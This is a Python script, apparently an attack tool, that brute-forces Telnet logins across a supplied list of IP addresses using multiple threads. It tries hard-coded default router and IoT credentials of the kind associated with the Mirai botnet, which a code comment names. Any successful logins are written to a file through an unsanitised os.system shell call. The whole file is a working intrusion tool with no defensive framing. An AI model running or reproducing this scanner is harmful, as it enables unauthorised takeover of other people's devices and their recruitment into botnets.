#!/usr/bin/python
# Simple Telnet Bruter | By; LiGhT
# Lots of false possitives but pulls alot of results extremely fast

import threading
import sys, os, re, time, socket
from Queue import *
from sys import stdout

if len(sys.argv) < 4:
	print "Usage: python "+sys.argv[0]+" <list> <threads> <output file>"
	sys.exit()

combo = [ 
	"support:support",
	"root:vizxv",
	"root:xc3511",
	"telnet:telnet",
	"root:root",
	"supervisor:zyad1234",
	"root: ",
	"admin:1234",
	"user:user", 
	"root:antslq", 
	"admin:admin",
	"root:5up"
]


ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
output_file = sys.argv[3]
queue = Queue()
queue_count = 0

for ip in ips:
	queue_count += 1
	stdout.write("\r[%d] Added to queue" % queue_count)
	stdout.flush()
	queue.put(ip)
print "\n"


class router(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		username = ""
		password = ""
		for passwd in combo:
			if ":n/a" in passwd:
				password=""
			else:
				password=passwd.split(":")[1]
			if "n/a:" in passwd:
				username=""
			else:
				username=passwd.split(":")[0]
			try:
				tn = socket.socket()
				tn.settimeout(8)
				tn.connect((self.ip,23))
			except Exception:
				tn.close()
				break
			try:
				hoho = ''
				hoho += readUntil(tn, "ogin:")
				if "ogin" in hoho:
					tn.send(username + "\n")
					time.sleep(0.09)
			except Exception:
				tn.close()
			try:
				hoho = ''
				hoho += readUntil(tn, "assword:")
				if "assword" in hoho:
					tn.send(password + "\n")
					time.sleep(0.8)
				else:
					pass
			except Exception:
				tn.close()
			try:
				prompt = ''
				prompt += tn.recv(40960)
				if ">" in prompt and "ONT" not in prompt:
					success = True
				elif "#" in prompt or "$" in prompt or "%" in prompt or "@" in prompt:
					success = True				
				else:
					tn.close()
				if success == True:
					try:
						os.system("echo "+self.ip+":23 "+username+":"+password+" >> "+output_file+"") # 1.1.1.1:23 user:pass # mirai
						print "\033[1;37m%s\033[36m:\033[1;37m%s\033[1;36m:\033[1;36m%s\033[37m"%(username, password, self.ip)
						tn.close()
						break
					except:
						tn.close()
				else:
					tn.close()
			except Exception:
				tn.close()

def readUntil(tn, string, timeout=8):
	buf = ''
	start_time = time.time()
	while time.time() - start_time < timeout:
		buf += tn.recv(1024)
		time.sleep(0.01)
		if string in buf: return buf
	raise Exception('TIMEOUT!')

def worker():
	try:
		while True:
			try:
				IP = queue.get()
				thread = router(IP)
				thread.start()
				queue.task_done()
				time.sleep(0.02)
			except:
				pass
	except:
		pass

for l in xrange(threads):
	try:
		t = threading.Thread(target=worker)
		t.start()
	except:
		pass